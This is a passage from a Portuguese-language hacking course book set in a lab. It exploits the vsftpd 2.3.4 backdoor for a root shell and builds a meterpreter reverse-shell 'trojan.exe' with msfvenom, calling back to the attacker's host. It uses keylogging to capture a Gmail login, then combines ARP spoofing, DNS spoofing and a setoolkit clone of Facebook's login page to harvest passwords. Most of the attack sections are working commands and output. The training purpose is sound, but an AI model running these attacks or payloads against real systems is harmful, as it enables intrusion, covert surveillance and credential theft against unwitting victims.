ao Metasploitabl2, porém caso você queira utilizar o nmap em um terminal separado é possível. Para utilizar o nmap dentro do msfconsole. Digite o comando db_nmap e o comando a ser utilizado. Veja o exemplo abaixo: msf > db_nmap -O -sV 172.16.0.12<br /> <br /> [*] Nmap: Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-31 00:47 BST [*] Nmap: Nmap scan report for 172.16.0.12 [*] Nmap: Host is up (0.00032s latency). [*] Nmap: Not shown: 977 closed ports [*] Nmap: PORT STATE SERVICE VERSION [*] Nmap: 21/tcp open ftp vsftpd 2.3.4 [*] Nmap: 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) [*] Nmap: 23/tcp open telnet Linux telnetd [*] Nmap: 25/tcp open smtp Postﬁx smtpd [*] Nmap: 53/tcp open domain ISC BIND 9.4.2 [*] Nmap: 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2) [*] Nmap: 111/tcp open rpcbind 2 (RPC #100000) [*] Nmap: 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) [*] Nmap: 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) [*] Nmap: 512/tcp open exec netkit-rsh rexecd<br /> <br /> 280<br /> <br /> [*] Nmap: 513/tcp open login [*] Nmap: 514/tcp open tcpwrapped [*] Nmap: 1099/tcp open rmiregistry GNU Classpath grmiregistry [*] Nmap: 1524/tcp open shell Metasploitable root shell [*] Nmap: 2049/tcp open nfs 2-4 (RPC #100003) [*] Nmap: 2121/tcp open ftp ProFTPD 1.3.1 [*] Nmap: 3306/tcp open mysql MySQL 5.0.51a-3ubuntu5 [*] Nmap: 5432/tcp open postgresql PostgreSQL DB 8.3.0 - 8.3.7 [*] Nmap: 5900/tcp open vnc VNC (protocol 3.3) [*] Nmap: 6000/tcp open X11 (access denied) [*] Nmap: 6667/tcp open irc UnrealIRCd [*] Nmap: 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) [*] Nmap: 8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1 [*] Nmap: MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) [*] Nmap: Device type: general purpose [*] Nmap: Running: Linux 2.6.X [*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:2.6 [*] Nmap: OS details: Linux 2.6.9 - 2.6.33 [*] Nmap: Network Distance: 1 hop [*] Nmap: Service Info: Hosts: metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Na consoleat https://nmap.org/submit/ . [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds<br /> <br /> msf > db_nmap: Ativa o uso do nmap através da console do metasploit framework. -O: Escaneia o nome do SO e a versão. -sV: Escaneia as versões dos serviços e as portas correspondentes.<br /> <br /> Este comando nos trouxe as versões dos serviços ativos e do sistema operacional da máquina 172.16.0.12, nossa máquina alvo Metasploitable2. Após tomar conhecimento dos serviços ativos, vamos escolher o serviço a ser explorado e realizar uma busca dentro do banco de dados do Metasploit Framework. Vamos escolher o serviço FTP (vsftpd 2.3.4) da máquina Metasploitable2 para ser explorado. Digite no console: 281<br /> <br /> msf > search vsftpd Matching Modules ================ Name Disclosure Date Rank ------ --------- ---- -----------<br /> <br /> Description<br /> <br /> exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 VSFTPD v2.3.4 Backdoor Command Execution<br /> <br /> excellent<br /> <br /> msf > Observe que ele encontrou um exploit disponível em sua base de dados. Vamos analisar este exploit: exploit/unix/ftp/vsftpd_234_backdoor: Nome e local do exploit. 2011-07-03: Data de criação deste exploit. excellent : Categoria do rank de utilização. VSFTPD v2.3.4 Backdoor Command Execution: Descrição do serviço, nome e versão do serviço para qual o exploit foi criado e qual a função do mesmo, neste caso backdoor. Podemos observar que este exploit se aplica à nossa máquina alvo, pois este exploit foi criado para o mesmo serviço e versão. Vamos utilizá-lo, então, para isso digite no msfconsole: msf > use exploit/unix/ftp/vsftpd_234_backdoor msf exploit(vsftpd_234_backdoor) > Ao selecionar o exploit para uso, vamos verificar as suas opções de uso. Digite no console: 282<br /> <br /> msf exploit(vsftpd_234_backdoor) > show options Module options (exploit/unix/ftp/vsftpd_234_backdoor): Name Current Setting Required Description ---- --------------- -------- ----------RHOST yes The target address RPORT 21 yes The target port (TCP) Exploit target: Id Name -- ---0 Automatic<br /> <br /> msf exploit(vsftpd_234_backdoor) > Neste caso somente precisamos indicar o IP do nosso alvo (host Metasploitable2). Digite no console: msf exploit(vsftpd_234_backdoor) > set rhost 172.16.0.12 rhost => 172.16.0.12 Agora vamos executar este exploit. Digite no console: msf exploit(vsftpd_234_backdoor) > run [*] 172.16.0.12:21 - Banner: 220 (vsFTPd 2.3.4) [*] 172.16.0.12:21 - USER: 331 Please specify the password. [+] 172.16.0.12:21 - Backdoor service has been spawned, handling... [+] 172.16.0.12:21 - UID: uid=0(root) gid=0(root) [*] Found shell. [*] Command shell session 1 opened (172.16.0.15:36191 -> 172.16.0.12:6200) at 2017-05-31 01:13:35 +0100<br /> <br /> 283<br /> <br /> Observe que ele abriu uma conexão com esta máquina alvo, conseguindo burlar todo o sistema e nos dando acesso ao usuário root nesta máquina. Nesse mesmo console podemos inserir os comandos que serão executados na máquina alvo. Veja o exemplo abaixo: [*] Command shell session 1 opened (172.16.0.15:36191 -> 172.16.0.12:6200) at 2017-05-31 01:13:35 +0100 uname -r 2.6.24-16-server ls -lh / total 89K drwxr-xr-x 2 root root 4.0K May 13 2012 bin drwxr-xr-x 4 root root 1.0K May 13 2012 boot drwxr-xr-x 14 root root 14K May 30 19:32 dev drwxr-xr-x 95 root root 4.0K May 30 19:33 etc ...<br /> <br /> Observe que obtivemos acesso total ao sistema. Podemos utilizar este mesmo processo para qualquer serviço em que a máquina alvo esteja vulnerável. Fonte: Videoaula TDI – BootCamp de Metasploit – Exploits<br /> <br /> 6.3.<br /> <br /> Payloads<br /> <br /> Uma Payload é uma carga útil de informação a qual refere-se à carga de uma transmissão de dados. Podemos explorar vulnerabilidades que foram geradas e enviar à máquina alvo. Uma vez executada esta carga na máquina host, a payload é aplicada e o SO alvo interpreta os comandos contido nela. Por exemplo, existe um vírus que, de alguma forma, chegou à máquina do nosso alvo, através de e-mail, embutidos em outros programas, enfim, o usuário o 284<br /> <br /> executou. Nesse momento o vírus abre uma conexão com a máquina do atacante, permitindo acesso total ao sistema. Vamos realizar um ataque a uma máquina Windows, para isto vamos criar uma payload através do msfvenon. Mas, primeiramente, vamos procurar no msfconsole a payload referente para a criação. Digite no msfconsole: msf > search meterpreter Matching Modules ================ Name Disclosure Date Rank Description ----- ---------- -------------auxiliary/server/android_browsable_msf_launch normal Android Meterpreter Browsable Launcher exploit/firefox/local/exec_shellcode 2014-03-10 normal Firefox Exec Shellcode from Privileged Javascript Shell ... payload/windows/meterpreter/reverse_tcp normal Windows Meterpreter (Reﬂective Injection), Reverse TCP Stager payload/windows/x64/meterpreter/reverse_tcp normal Windows Meterpreter (Reﬂective Injection x64), Windows x64 Reverse TCP Stager post/windows/manage/priv_migrate normal Windows Manage Privilege Based Process Migration msf ><br /> <br /> Observe que ele irá apresentar tudo que contenha a descrição meterpreter existente no banco de dados. Procure o meterpreter referente ao Windows. Vamos utilizar a payload/windows/meterpreter/ reverse_tcp. 285<br /> <br /> Esta payload irá fazer com que a máquina Windows alvo abra uma conexão TCP reversa e nos disponibilize acesso via shell. Agora abra o terminal do Kali Linux e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="14667b7b60547f75787d">[email&#160;protected]</a>:~# msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe lhost=172.16.0.15 lport=80 -o /root/trojan.exe No encoder or badchars speciﬁed, outputting raw payload Payload size: 333 bytes Final size of exe ﬁle: 73802 bytes Saved as: /root/trojan.exe msfvenom : Executa a ferramenta do Metasploit Framework msfvenon. -p: Indica a payload a ser utilizada, neste caso a windows/meterpreter/reverse_tcp . --platform : Indica a plataforma do sistema operacional do alvo, neste caso windows. -a: Indica a arquitetura do executável que será criado para o SO alvo, neste caso x86 . -f: Indica o formato do executável a ser criado, neste caso exe . lhost=172.16.0.19 : Indica o IP da máquina que irá receber a conexão. lport=80 : Indica a porta que o atacante irá escutar a comunicação com a máquina alvo, neste caso a porta 80. -o/root/trojan.exe : Indica o nome do arquivo a ser gerado, neste caso o arquivo trojan.exe será criado no diretório /root. Este comando irá criar um executável para Windows que irá abrir uma comunicação com a máquina do atacante, com o nome trojan.exe, vamos utilizar a porta 80 pois é uma porta que caso o alvo esteja utilizando um firewall, iremos conseguir acesso facilmente pois esta porta é utilizada para a navegação 286<br /> <br /> na internet. Este executável será criado no diretório /root. Para poder explorar esta vulnerabilidade nós precisamos acessar um exploit que se chama multi/ handler, ele irá estabelecer uma comunicação com o payload que foi gerado, este exploit pode ser utilizado para inúmeras plataformas, como Android, Java, Linux, Windows, entre outros. Para utiliza-la, abra o msfconsole e digite: msf > use multi/handler msf exploit(handler) > Agora vamos fazer com que a payload que utilizamos na criação do trojan.exe seja utilizada pelo exploit, digite no msfconsole: msf exploit(handler) > set payload windows/meterpreter/ reverse_tcp payload => windows/meterpreter/reverse_tcp Vamos verificar as configurações de opções que podemos utilizar com este exploit, digite: msf exploit(handler) > show options Module options (exploit/multi/handler): Name Current Setting Required Description ----- ---------- -------- ----------Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ----- ---------- -------- -----------<br /> <br /> 287<br /> <br /> EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST yes The listen address LPORT 4444 yes The listen port Exploit target: Id Name -- ---0 Wildcard Target msf exploit(handler) ><br /> <br /> Vamos configurar o LHOST e o LPORT que foram indicados na criação do trojan.exe, digite no msfconsole: msf exploit(handler) > set lhost 172.16.0.15 lhost => 172.16.0.15 msf exploit(handler) > set lport 80 lport => 80 Verifique se as configurações foram corretamente aplicadas, digite no console: msf exploit(handler) > show options Module options (exploit/multi/handler):<br /> <br /> Name Current Setting Required Description ---- --------------- -------- ----------Payload options (windows/meterpreter/reverse_tcp): Name Current Setting ------------------ -------EXITFUNC process thread, process, none) LHOST 172.16.0.15<br /> <br /> Required Description ----------yes Exit technique (Accepted: '', seh, yes<br /> <br /> The listen address<br /> <br /> 288<br /> <br /> LPORT<br /> <br /> 80<br /> <br /> yes<br /> <br /> The listen port<br /> <br /> Exploit target: Id Name -- ---0 Wildcard Target msf exploit(handler) ><br /> <br /> Com as opções configuradas, agora vamos iniciar o exploit: msf exploit(handler) > run [*] Started reverse TCP handler on 172.16.0.15:80 [*] Starting the payload handler… Observe que o exploit está aguardando conexões. Agora, copie o arquivo trojan.exe para a máquina Windows e execute o trojan.exe. Você irá perceber que após a execução, nada no Windows irá mudar visualmente para o usuário. Porém, no instante da execução, o Windows abriu uma conexão com o exploit do msfconsole. Abra o console e verifique: [*] Started reverse TCP handler on 172.16.0.15:80 [*] Starting the payload handler... [*] Sending stage (957487 bytes) to 172.16.0.19 [*] Meterpreter session 1 opened (172.16.0.15:80 -> 172.16.0.19:49172) at 2017-05-31 03:14:10 +0100 meterpreter > Observe que a comunicação estabelecida pela máquina alvo abriu o console do meterpreter. 289<br /> <br /> Fonte: Videoaula TDI – BootCamp de Metasploit – Payloads<br /> <br /> 6.4.<br /> <br /> Meterpreter<br /> <br /> O meterpreter é o interpretador do Metasploit, ele irá identificar a plataforma e sistema do alvo e interpretar os comandos para que o msfconsole do atacante possa utilizar estes comandos através da payload que foi carregado na máquina alvo. Continuando a exploração do nosso ataque anterior, digite no console do meterpreter “?” Para sabermos os comandos que podemos utilizar nesta máquina alvo, veja o exemplo abaixo: meterpreter > ? Core Commands ============= Command Description ----------------? Help menu background Backgrounds the current session bgkill Kills a background meterpreter script bglist Lists running background scripts bgrun Executes a meterpreter script as a background thread channel Displays information or control active channels close Closes a channel disable_unicode_encoding Disables encoding of unicode strings enable_unicode_encoding Enables encoding of unicode strings 290<br /> <br /> exit Terminate the meterpreter session get_timeouts Get the current session timeout values help Help menu info Displays information about a Post module irb Drop into irb scripting mode load Load one or more meterpreter extensions machine_id Get the MSF ID of the machine attached to the session migrate Migrate the server to another process quit Terminate the meterpreter session read Reads data from a channel resource Run the commands stored in a ﬁle run Executes a meterpreter script or Post module sessions Quickly switch to another session set_timeouts Set the current session timeout values sleep Force Meterpreter to go quiet, then reestablish session. transport Change the current transport mechanism use Deprecated alias for 'load' uuid Get the UUID for the current session write Writes data to a channel Stdapi: File system Commands ============================ Command Description ----------------cat Read the contents of a ﬁle to the screen cd Change directory checksum Retrieve the checksum of a ﬁle cp Copy source to destination dir List ﬁles (alias for ls) download Download a ﬁle or directory edit Edit a ﬁle 291<br /> <br /> getlwd Print local working directory getwd Print working directory lcd Change local working directory lpwd Print local working directory ls List ﬁles mkdir Make directory mv Move source to destination pwd Print working directory rm Delete the speciﬁed ﬁle rmdir Remove directory search Search for ﬁles show_mount List all mount points/logical drives upload Upload a ﬁle or directory Stdapi: Networking Commands =========================== Command Description ----------------arp Display the host ARP cache getproxy Display the current proxy conﬁguration ifconfig Display interfaces ipconfig Display interfaces netstat Display the network connections portfwd Forward a local port to a remote service resolve Resolve a set of host names on the target route View and modify the routing table Stdapi: System Commands ======================= Command Description ----------------clearev Clear the event log 292<br /> <br /> drop_token Relinquishes any active impersonation token. execute Execute a command getenv Get one or more environment variable values getpid Get the current process identiﬁer getprivs Attempt to enable all privileges available to the current process getsid Get the SID of the user that the server is running as getuid Get the user that the server is running as kill Terminate a process localtime Displays the target system's local date and time ps List running processes reboot Reboots the remote computer reg Modify and interact with the remote registry rev2self Calls RevertToSelf() on the remote machine shell Drop into a system command shell shutdown Shuts down the remote computer steal_token Attempts to steal an impersonation token from the target process suspend Suspends or resumes a list of processes sysinfo Gets information about the remote system, such as OS Stdapi: User interface Commands =============================== Command Description ----------------enumdesktops List all accessible desktops and window stations getdesktop Get the current meterpreter desktop idletime Returns the number of seconds the remote user has been idle keyscan_dump Dump the keystroke buffer keyscan_start Start capturing keystrokes keyscan_stop Stop capturing keystrokes 293<br /> <br /> screenshot Grab a screenshot of the interactive desktop setdesktop Change the meterpreters current desktop uictl Control some of the user interface components Stdapi: Webcam Commands ======================= Command Description ----------------record_mic Record audio from the default microphone for X seconds webcam_chat Start a video chat webcam_list List webcams webcam_snap Take a snapshot from the speciﬁed webcam webcam_stream Play a video stream from the speciﬁed webcam Priv: Elevate Commands ====================== Command Description ----------------getsystem Attempt to elevate your privilege to that of local system. Priv: Password database Commands ================================ Command Description ----------------hashdump Dumps the contents of the SAM database Priv: Timestomp Commands 294<br /> <br /> ======================== Command Description ----------------timestomp Manipulate ﬁle MACE attributes Observe que existe inúmeros comandos que podemos executar na máquina alvo através do meterpreter, veja alguns comandos interessante: webcam_stream Reproduzir uma stream de vídeo a partir da webcam especificada. keyscan_start Começa a capturar batimentos de tecla. keyscan_dump Baixa o buffer de tecla. keyscan_stop Para de capturar batidas de tecla. Obtém informações sobre o sysinfo sistema remoto, como o SO. Imprime na tela o diretório pwd corrente Vamos agora verificar em que diretório estamos e enviar um arquivo para o Desktop do usuário. Digite no console do meterpreter: meterpreter > pwd C:\Users\user\Desktop\shared meterpreter > cd .. meterpreter > pwd C:\Users\user\Desktop meterpreter > upload -r /root/invasao.txt . [*] uploading : /root/invasao.txt -> . [*] uploaded : /root/invasao.txt -> .\invasao.txt meterpreter > 295<br /> <br /> Verifique na máquina Windows se o arquivo foi enviado.<br /> <br /> Agora vamos realizar a captura do teclado: digite no console do meterpreter: meterpreter > keyscan_start Starting the keystroke sniffer... Inicie um e-mail, conversa em chat, qualquer entrada de teclado na máquina Windows. Após realizar, por exemplo o uso do Gmail, baixe o que foi digitado no teclado, digite no console: meterpreter > keyscan_dump Dumping captured keystrokes... 296<br /> <br /> gmail.com <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="196d717674696a767759">[email&#160;protected]</a> ~gmail.com minhasenha Observe que ele capturou tudo o que foi digitado no teclado da máquina alvo. Agora vamos para o keyscan. Digite no console: meterpreter > keyscan_stop Stopping the keystroke sniffer... Vamos desligar a máquina do alvo, então digite no console: meterpreter > shutdown Shutting down... meterpreter > [*] 172.16.0.19 - Meterpreter session 1 closed. Reason: Died Como você pode observar são inúmeros os comandos que podemos utilizar através do meterpreter, enjoy! Fonte: Videoaula TDI – BootCamp de Metasploit – Meterpreter<br /> <br /> 297<br /> <br /> Chapter 11<br /> <br /> 298<br /> <br /> UNIDADE 11 2. ATAQUES NA REDE 1.<br /> <br /> MAIN IN THE MIDDLE<br /> <br /> O man-in-the-middle (MITM) é uma forma de ataque em que os dados trocados entre duas partes são de alguma forma interceptados, registrados e possivelmente alterados pelo atacante sem que as vítimas se apercebam. Em uma comunicação normal, os dois elementos envolvidos se comunicam entre si sem interferências através de um meio, uma rede local à Internet ou ambas. Durante o ataque man-in-the-middle, a comunicação é interceptada pelo atacante e retransmitida por este de uma forma discricionária. O atacante pode decidir retransmitir entre os legítimos participantes os dados inalterados, com alterações ou bloquear partes da informação.<br /> <br /> Como os participantes legítimos da comunicação não se apercebem que os dados estão a ser adulterados, tomam-nos como válidos, fornecendo informações e executando instruções por ordem do atacante. 1.1.<br /> <br /> ARP Spoofing 299<br /> <br /> ARP spoofing ou ARP cache poisoning é uma técnica em que um atacante envia mensagens ARP (Address Resolution Protocol) com o intuito de associar seu endereço MAC ao endereço IP de outro host, como o endereço IP do gateway padrão, fazendo com que todo o tráfego seja enviado para o endereço IP do atacante ao invés do endereço IP do gateway. O ARP spoofing permite que o atacante intercepte quadros trafegados na rede, modifique os quadros trafegados e até é capaz de parar todo o tráfego. Esse tipo de ataque só ocorre em segmentos da rede de área local (local area networks - LAN) que usam o ARP para fazer a resolução de endereços IP em endereços da camada de enlace. O arpspoofing é uma ferramenta da suíte do Kali Linux. Primeiramente vamos verificar a tabela ARP da rede, então digite no terminal: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7d0f1212093d161c1114">[email&#160;protected]</a>:~# arp -a ? (192.168.0.24) at 08:00:27:cc:74:71 [ether] on eth0 ? (192.168.0.14) at 6c:88:14:0c:5a:88 [ether] on eth0 routerlogin.net (192.168.0.1) at 50:6a:03:48:30:4f [ether] on eth0 arp : executa a aplicação arp. -a: exibe todas as entradas ARP corrente lidas da tabela. Observe que na tabela temos 3 dispositivos: além do Kali que está sendo utilizado, temos os endereços IP e MAC dos dispositivos na rede. Realizando o redirecionamento de pacotes<br /> <br /> 300<br /> <br /> Digite o comando abaixo no Kali Linux para que ele permita o redirecionamento de tráfego das informações. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="70021f1f04301b111c19">[email&#160;protected]</a>:~# echo “1” > /proc/sys/net/ipv4/ip_forward Esse comando escreve o número 1 dentro do arquivo ip_forward, ativando o roteamento de pacote. O padrão é 0. Com isso o Linux passa a rotear os pacotes de uma interface para a outra e vice-versa. Utilizando o ARP Spoofing Através da tabela ARP que foi apresentada vamos escolher os alvos: ? (192.168.0.24) at 08:00:27:cc:74:71 [ether] on eth0 ? (192.168.0.14) at 6c:88:14:0c:5a:88 [ether] on eth0 routerlogin.net (192.168.0.1) at 50:6a:03:48:30:4f [ether] on eth0 Primeiramente vamos verificar o IP e MAC da máquina atacante, o Kali Linux. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3e4c51514a7e555f5257">[email&#160;protected]</a>:~# ifconfig eth0: ﬂags=4163 mtu 1500 inet 192.168.0.25 netmask 255.255.255.0 broadcast 192.168.0.255 inet6 fe80::a00:27ff:fe2d:3d79 preﬁxlen 64 scopeid 0x20 ether 08:00:27:2d:3d:79 txqueuelen 1000 (Ethernet) RX packets 3709 bytes 253367 (247.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 867 bytes 127350 (124.3 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 301<br /> <br /> Podemos observar que o Kali está utilizando o IP 192.168.0.25 na interface eth0 e o MAC desta interface é 08:00:27:2d:3d:79. Digite o comando abaixo no Kali Linux para que ele realize a replicação do MAC da máquina vítima. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ea9885859eaa818b8683">[email&#160;protected]</a>:~# arpspoof -i eth0 -t 192.168.0.14 -r 192.168.0.24 8:0:27:2d:3d:79 6c:88:14:c:5a:88 0806 42: arp reply 192.168.0.24 is-at 8:0:27:2d:3d:79 8:0:27:2d:3d:79 8:0:27:cc:74:71 0806 42: arp reply 192.168.0.14 is-at 8:0:27:2d:3d:79 arpspoof : executa a aplicação arpspoofing. -i: Indica a interface que irá escutar os dados, no caso eth0. -t: Indica o IP da máquina VITIMA_01, neste caso 192.168.0.14. -r: Indica o IP da máquina VITIMA_02 a ser interceptada, neste caso 192.168.0.24. Desta forma todos os dados que a VITIMA_01 enviar para VITIMA_02 serão trafegados através da máquina Kali Linux do atacante. Dessa forma o atacante está no meio da conexão. Caso a VITIMA_01 verifique a tabela ARP, o MAC da VITIMA_02 estará com o mesmo MAC do ATACANTE - e vice-versa. Tabela ARP VITIMA_01: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d6a3a5b3a496809f829f9b97">[email&#160;protected]</a>_01:~$ arp -a ? (192.168.0.25) at 08:00:27:2d:3d:79 [ether] on wlp3s0 ? (192.168.0.1) at 50:6a:03:48:30:4f [ether] on wlp3s0 ? (192.168.0.24) at 08:00:27:2d:3d:79 [ether] on wlp3s0 302<br /> <br /> Tabela ARP VITIMA_02: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ff8a8c9a8dbfa9b6abb6b2be">[email&#160;protected]</a>_02:~$ arp -a routerlogin.net (192.168.0.1) at 50:6A:03:48:30:4F [ether] on eth0 ? (192.168.0.25) at 08:00:27:2D:3D:79 [ether] on eth0 ? (192.168.0.14) at 08:00:27:2D:3D:79 [ether] on eth0 Pode-se utilizar o WireShark para visualizar os dados trafegados entre os dispositivos. Fonte: Videoaula TDI – Ataques na Rede –Redirecionamento de Tráfego - ARP Spoofing<br /> <br /> 1.2.<br /> <br /> DNS Spoofing<br /> <br /> DNS spoofing ou DNS cache poisoning é uma técnica em que os dados corruptos do DNS são introduzidos no cache do revolvedor de DNS, fazendo com que o nome do servidor devolva um endereço IP incorreto. Isso resulta em ser desviado para o computador do invasor (ou qualquer outro computador). Criando uma armadilha - setoolkit Vamos clonar o site que desejamos realizar o DNS Spoofing, para isto iremos utilizar a ferramenta setoolkit. Primeiramente vamos editar o arquivo de configuração desta ferramenta, para que ele utilize o diretório do Apache para armazenar os arquivos da página. Edite o arquivo desta forma: /etc/setoolkit/set.config. 303<br /> <br /> Altere a opção “APACHE_SERVER=” para ON e verifique se o diretório do apache está correto, no parâmetro “APACHE_DIRECTORY=” como demonstrado abaixo: ### Use Apache instead of the standard Python web server. This will increase the speed ### of the attack vector. APACHE_SERVER=ON # ### Path to the Apache web root. APACHE_DIRECTORY=/var/www # Agora podemos realizar o clone do site, para isso siga os passos abaixo: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="75071a1a01351e14191c">[email&#160;protected]</a>:~# setoolkit<br /> <br /> … Select from the menu: 1) Social-Engineering Attacks 2) Penetration Testing (Fast-Track) 3) Third Party Modules 4) Update the Social-Engineer Toolkit 5) Update SET conﬁguration 6) Help, Credits, and About 99) Exit the Social-Engineer Toolkit<br /> <br /> set> 1 Vamos escolher a opção 1 “Social-Engineering Attacks”- essa opção possui alguns tipos de Ataques para Engenharia Social: Select from the menu: 1) Spear-Phishing Attack Vectors 2) Website Attack Vectors 3) Infectious Media Generator 304<br /> <br /> 4) Create a Payload and Listener 5) Mass Mailer Attack 6) Arduino-Based Attack Vector 7) Wireless Access Point Attack Vector 8) QRCode Generator Attack Vector 9) Powershell Attack Vectors 10) SMS Spooﬁng Attack Vector 11) Third Party Modules 99) Return back to the main menu. set> 2 Agora selecione a opção 2 “Website Attack Vectors”: 1) Java Applet Attack Method 2) Metasploit Browser Exploit Method 3) Credential Harvester Attack Method 4) Tabnabbing Attack Method 5) Web Jacking Attack Method 6) Multi-Attack Web Method 7) Full Screen Attack Method 8) HTA Attack Method 99) Return to Main Menu set:webattack> 3 Selecione a opção 3 para escolher de credenciais. Agora escolha do tipo do método para roubar a credencial. Aqui, a vamos selecionar a opção 2, que de algum site indicado.<br /> <br /> o método de roubo que iremos utilizar título de exemplo, irá realizar o clone<br /> <br /> 1) Web Templates 305<br /> <br /> 2) Site Cloner 3) Custom Import 99) Return to Webattack Menu set:webattack> 2 Agora entre com o IP que irá receber a importação da página, do Kali Linux: [-] Credential harvester will allow you to utilize the clone capabilities within SET [-] to harvest credentials or parameters from a website as well as place them into a report [-] This option is used for what IP the server will POST to. [-] If you're using an external IP, use your external IP for this set:webattack> IP address for the POST back in Harvester/ Tabnabbing:192.168.0.25 Agora entre com a URL do site a ser clonado. Vamos realizar um clone do site do facebook.com: [-] SET supports both HTTP and HTTPS [-] Example: http://www.thisisafakesite.com set:webattack> Enter the url to clone: www.facebook.com Após entrar com a URL, o setoolkit irá avisar que é necessário que o apache esteja sendo executado. Faça uma entrada nele com y para que ele inicie o apache, caso esteja desabilitado. [*] Cloning the website: https://login.facebook.com/login.php [*] This could take a little bit... The best way to use this attack is if username and password form 306<br /> <br /> ﬁelds are available. Regardless, this captures all POSTs on a website. [*] Apache is set to ON - everything will be placed in your web root directory of apache. [*] Files will be written out to the root directory of apache. [*] ALL ﬁles are within your Apache directory since you speciﬁed it to ON. [!] Apache may be not running, do you want SET to start the process? [y/n]: y [ ok ] Starting apache2 (via systemctl): apache2.service. Apache webserver is set to ON. Copying over PHP ﬁle to the website. Please note that all output from the harvester will be found under apache_dir/harvester_date.txt Feel free to customize post.php in the /var/www/html directory [*] All ﬁles have been copied to /var/www/html [*] SET is now listening for incoming credentials. You can control-c out of this and completely exit SET at anytime and still keep the attack going. [*] All ﬁles are located under the Apache web root directory: / var/www/html [*] All ﬁelds captures will be displayed below. [Credential Harvester is now listening below...] Ao realizar estes passos, ele irá ficar aguardando o acesso à página fake e irá criar um arquivo harvester_ANO-MES-DIA HORA.329039.txt no diretório /var/www/html. Esse arquivo irá conter os dados que foram capturados. Realizando o redirecionamento de pacotes Abra outro terminal e digite o comando abaixo no Kali Linux para que ele permita o redirecionamento de tráfego dos pacotes: 307<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="89fbe6e6fdc9e2e8e5e0">[email&#160;protected]</a>:~# echo “1” > /proc/sys/net/ipv4/ip_forward Criar o arquivo de hosts DNS Agora vamos criar o arquivo de hosts DNS que será onde o atacante irá inserir os endereços de nome que ele deseja capturar os dados. Esse arquivo deve ser similar ao /usr/share/dnsiff/dnsspoof.hosts. Crie o arquivo e insira o IP da máquina do atacante e o domínio que será o alvo, como o exemplo abaixo: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="12607d7d665279737e7b">[email&#160;protected]</a>:~# vim dnsspoof.hosts 192.168.0.25 *.facebook.* Salve o arquivo e agora iremos para a etapa de envenenamento do DNS. Utilizando o DNS Spoofing O dnsspoofing é uma ferramenta da suíte do Kali Linux. Vamos realizar o envenenamento do DNS. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="0f7d60607b4f646e6366">[email&#160;protected]</a>:~# dnsspoof -i eth0 -f dnsspoof.hosts dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.0.25] Agora ele está configurado para redirecionar o DNS da rede na interface do atacante, porém somente as requisições dos domínios inseridos no arquivo dnsspoof.hosts que serão redirecionados à máquina do atacante. Realizando o envenenamento do ARP 308<br /> <br /> Agora iremos realizar o redirecionamento da máquina da vítima para o roteador através da interface da máquina do atacante. Em um outro terminal digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5d2f3232291d363c3134">[email&#160;protected]</a>:~# arpspoof -i eth0 -t 192.168.0.14 -r 192.168.0.1 8:0:27:2d:3d:79 6c:88:14:c:5a:88 0806 42: arp reply 192.168.0.1 is-at 8:0:27:2d:3d:79 8:0:27:2d:3d:79 50:6a:3:48:30:4f 0806 42: arp reply 192.168.0.14 is-at 8:0:27:2d:3d:79 A captura do tráfego de dados está completamente realizada. Agora sempre que a vítima acessar o site www.facebook.com ele será redirecionado para a página fake do facebook na máquina do atacante que foi clonada através do setoolkit. Analisando os dados As credenciais podem ser verificadas na tela do setoolkit ou no arquivo no diretório /var/www/ html que o setoolkit gerou. Veja onde encontrar as credenciais na tela do setoolkit: ('Array\n',) ('(\n',) (' [lsd] => AVoNX38g\n',) (' [display] => \n',) (' [enable_proﬁle_selector] => \n',) (' [isprivate] => \n',) (' [legacy_return] => 0\n',) (' [proﬁle_selector_ids] => \n',) 309<br /> <br /> (' [return_session] => \n',) (' [skip_api_login] => \n',) (' [signed_next] => \n',) (' [trynum] => 1\n',) (' [timezone] => 480\n',) (' [lgndim] => eyJ3Ijo4MDAsImgiOjYwMCwiYXciOjgwMCwiYWgiOjU2MCwi YyI6MjR9\n',) (' [lgnrnd] => 070658_1Xac\n',) (' [lgnjs] => 1494997278\n',) (' [email] => <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f6829e999b86859998b6919b979f9ad895999b">[email&#160;protected]</a>\n',) (' [pass] => senha123\n',) (')\n',)<br /> <br /> Observações: (01) Quando a vítima inserir o login e senha de acesso à página, ele irá retornar para a página inicial de login. (02) Alguns roteadores, sistemas e aplicações possuem segurança aplicada, evitando, assim, o DNS spoof na rede LAN. Fonte: Videoaula TDI – Ataques na Rede – Redirecionamento de 